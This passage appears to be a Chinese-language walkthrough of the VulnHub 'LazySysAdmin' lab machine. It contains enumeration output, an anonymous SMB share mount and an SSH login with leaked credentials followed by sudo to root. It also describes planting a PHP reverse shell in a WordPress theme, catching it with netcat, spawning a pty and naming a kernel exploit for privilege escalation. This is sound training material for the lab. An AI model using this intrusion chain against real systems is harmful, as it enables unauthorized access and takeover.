     |  Style URL: http://192.168.0.100/wordpress/wp-content/themes/twentyfifteen/style.css
     |  Theme Name: Twenty Fifteen
     |  Theme URI: https://wordpress.org/themes/twentyfifteen/
     |  Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple,...
     |  Author: the WordPress team
     |  Author URI: https://wordpress.org/
    [+] Enumerating plugins from passive detection ...
    [+] No plugins found
    [+] Finished: Thu Feb  1 01:37:24 2018
    [+] Requests Done: 356
    [+] Memory used: 37.98 MB
    [+] Elapsed time: 00:00:04
enum4linux 192.168.0.100
    Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb  1 00:46:08 2018
     ========================== 
    |    Target Information    |
     ========================== 
    Target ........... 192.168.0.100
    RID Range ........ 500-550,1000-1050
    Username ......... ''
    Password ......... ''
    Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
     ===================================================== 
    |    Enumerating Workgroup/Domain on 192.168.0.100    |
     ===================================================== 
    [+] Got domain/workgroup name: WORKGROUP
     ============================================= 
    |    Nbtstat Information for 192.168.0.100    |
     ============================================= 
    Looking up status of 192.168.0.100
        LAZYSYSADMIN     -         B   Workstation Service
        LAZYSYSADMIN     -         B   Messenger Service
        LAZYSYSADMIN     -         B   File Server Service
        WORKGROUP        -  B   Domain/Workgroup Name
        WORKGROUP        -  B   Browser Service Elections
        MAC Address = 00-00-00-00-00-00
     ====================================== 
    |    Session Check on 192.168.0.100    |
     ====================================== 
    [+] Server 192.168.0.100 allows sessions using username '', password ''
     ============================================ 
    |    Getting domain SID for 192.168.0.100    |
     ============================================ 
    Domain Name: WORKGROUP
    Domain Sid: (NULL SID)
    [+] Can't determine if host is part of domain or part of a workgroup
     ======================================= 
    |    OS information on 192.168.0.100    |
     ======================================= 
    [+] Got OS info for 192.168.0.100 from smbclient: 
    [+] Got OS info for 192.168.0.100 from srvinfo:
        LAZYSYSADMIN   Wk Sv PrQ Unx NT SNT Web server
        platform_id     :   500
        os version      :   6.1
        server type     :   0x809a03
     ============================== 
    |    Users on 192.168.0.100    |
     ============================== 
     ========================================== 
    |    Share Enumeration on 192.168.0.100    |
     ========================================== 
    WARNING: The "syslog" option is deprecated
        Sharename       Type      Comment
        ---------       ----      -------        print$          Disk      Printer Drivers
        share$          Disk      Sumshare
        IPC$            IPC       IPC Service (Web server)
    Reconnecting with SMB1 for workgroup listing.
        Server               Comment
        ---------            -------    
        Workgroup            Master
        ---------            -------        WORKGROUP            
    [+] Attempting to map shares on 192.168.0.100
    //192.168.0.100/print$  Mapping: DENIED, Listing: N/A
    //192.168.0.100/share$  Mapping: OK, Listing: OK
    //192.168.0.100/IPC$    [E] Can't understand response:
    WARNING: The "syslog" option is deprecated
    NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
     ===================================================== 
    |    Password Policy Information for 192.168.0.100    |
     ===================================================== 
    [+] Attaching to 192.168.0.100 using a NULL share
    [+] Trying protocol 445/SMB...
    [+] Found domain(s):
        [+] LAZYSYSADMIN
        [+] Builtin
    [+] Password Info for Domain: LAZYSYSADMIN
        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000
            [+] Domain Refuse Password Change: 0
            [+] Domain Password Store Cleartext: 0
            [+] Domain Password Lockout Admins: 0
            [+] Domain Password No Clear Change: 0
            [+] Domain Password No Anon Change: 0
            [+] Domain Password Complex: 0
        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set
    [+] Retieved partial password policy with rpcclient:
    Password Complexity: Disabled
    Minimum Password Length: 5
     =============================== 
    |    Groups on 192.168.0.100    |
     =============================== 
    [+] Getting builtin groups:
    [+] Getting builtin group memberships:
    [+] Getting local groups:
    [+] Getting local group memberships:
    [+] Getting domain groups:
    [+] Getting domain group memberships:
     ======================================================================== 
    |    Users on 192.168.0.100 via RID cycling (RIDS: 500-550,1000-1050)    |
     ======================================================================== 
    [I] Found new SID: S-1-22-1
    [I] Found new SID: S-1-5-21-2952042175-1524911573-1237092750
    [I] Found new SID: S-1-5-32
    [+] Enumerating users using SID S-1-5-32 and logon username '', password ''
    S-1-5-32-500 *unknown*\*unknown* (8)
    S-1-5-32-544 BUILTIN\Administrators (Local Group)
    S-1-5-32-545 BUILTIN\Users (Local Group)
    S-1-5-32-546 BUILTIN\Guests (Local Group)
    S-1-5-32-547 BUILTIN\Power Users (Local Group)
    S-1-5-32-548 BUILTIN\Account Operators (Local Group)
    S-1-5-32-549 BUILTIN\Server Operators (Local Group)
    S-1-5-32-550 BUILTIN\Print Operators (Local Group)
    S-1-5-32-1000 *unknown*\*unknown* (8)
    S-1-5-32-1001 *unknown*\*unknown* (8)
    [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
    S-1-22-1-1000 Unix User\togie (Local User)
    [+] Enumerating users using SID S-1-5-21-2952042175-1524911573-1237092750 and logon username '', password ''
    S-1-5-21-2952042175-1524911573-1237092750-500 *unknown*\*unknown* (8)
    S-1-5-21-2952042175-1524911573-1237092750-501 LAZYSYSADMIN\nobody (Local User)
    S-1-5-21-2952042175-1524911573-1237092750-512 *unknown*\*unknown* (8)
    S-1-5-21-2952042175-1524911573-1237092750-513 LAZYSYSADMIN\None (Domain Group)
    S-1-5-21-2952042175-1524911573-1237092750-514 *unknown*\*unknown* (8)
     ============================================== 
    |    Getting printer info for 192.168.0.100    |
     ============================================== 
    No printers returned.
    enum4linux complete on Thu Feb  1 00:46:33 2018
windows下获取共享资源
    net use k: \\192.168.0.100\share$
linux下获取共享资源
    mount -t cifs -o username='',password='' //192.168.0.100/share$ /mnt
发现两个关键的文件deets.txt和wp-config.php
所以我们尝试用上面获取的mysql账号密码去登录phpmyadmin，但是发现没一个表项可以查看。
不过不要紧，上面还有一个密码是12345，而且之前我们登录WordPress页面的时候，页面显示My name is
togie.，所以我们可以用账号：togie 密码：12345尝试登录ssh，发现可以成功登录。
    togie@LazySysAdmin:~$ whoami
    togie
    togie@LazySysAdmin:~$ id
    uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
    togie@LazySysAdmin:~$ sudo su
    [sudo] password for togie: 
    root@LazySysAdmin:/home/togie# id
    uid=0(root) gid=0(root) groups=0(root)
有了root权限，我们就有权限查看目标文件/root/proof.txt，这样就算完成了整个游戏了。这里刚好togie有root权限，所以我直接用sudo
su切换到root权限，但是如果togie没有root权限，那么我们就需要通过其他方式来提权了。
### 思路二
通过账号：Admin 密码：TogieMYSQL12345^^登录WordPress控制面板，向404.php页面模板插入PHP反弹shell的代码。
编辑好后，点击下面的upload file应用，然后访问
    root@kali:~# nc -vlp 1234
    listening on [any] 1234 ...
    192.168.0.100: inverse host lookup failed: Unknown host
    connect to [192.168.0.109] from (UNKNOWN) [192.168.0.100] 36468
    Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
     16:03:42 up 6 min,  0 users,  load average: 0.01, 0.15, 0.11
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ sudo su
    sudo: no tty present and no askpass program specified
出现no tty present and no askpass program
specified，刚好目标机有python环境，所以我们导入Python的pty模块。
    python -c 'import pty; pty.spawn("/bin/sh")'
但是我们不知道www-data的密码，所以接下来就要进行提权，先来看一下目标机的详细信息
    $ uname -r
    4.4.0-31-generic
    $ lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 14.04.5 LTS
    Release:    14.04
    Codename:   trusty
所以用CVE-2017-1000112提权即可，但是目标机上没有gcc，这时候，我们可以本地搭建和目标机一样的环境，在本地编译好提权exp后，在目标机器上运行即可。
dirb安装方法（kali已自带）
    wget https://svwh.dl.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
    tar zxvf dirb222.tar.gz
    cd dirb222/
    apt-get install libcurl4-gnutls-dev
    ./configure && make
    ./dirb #运行即可
参考链接：
[VulnHub Walk-through – LazySysAdmin: 1](https://grokdesigns.com/vulnhub-walkthrough-lazysysadmin-1/)
[LazySysAdmin Vulnerable Machine Walk-through](https://uart.io/2017/12/lazysysadmin-1/)